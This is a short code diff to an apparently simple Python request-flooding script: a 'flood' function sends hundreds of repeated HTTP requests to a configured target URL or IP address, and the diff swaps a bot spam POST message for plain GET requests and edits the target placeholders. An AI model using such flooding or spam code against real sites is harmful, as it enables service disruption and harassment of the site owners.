@@ -8,14 +8,14 @@ def flood(url, count, delay):
     }
 
     for i in range(count):
-        data = {'message': f'This is a spam message from a bot'}
-        response = requests.post(url, headers=headers, data=data)
+        data = {}
+        response = requests.get(url, headers=headers, data=data)
 
         time.sleep(delay)  # Add a delay between each request
 
 def main():
-    url = "enter the target url"
-    count = 200 # Adjus the count or requests
+    url = "https://example.com"
+    count = 200
     delay = 1  # Adjust the delay time as desired
 
     flood(url, count, delay)
@@ -25,14 +25,12 @@ if __name__ == '__main__':
 
 
 def main():
-    ip_address = "192.179.10.0"
-    port = 80
-    count = 200
-    delay = 1 # Adjust this with your own desired 
+    ip_address = "Your target ip address"
+    count = 300
+    delay = 1 #Adjust the deplay time as desired 
+
 
     flood(ip_address, count, delay)
 
 if __name__ == '__main__':
     main()
-
-    
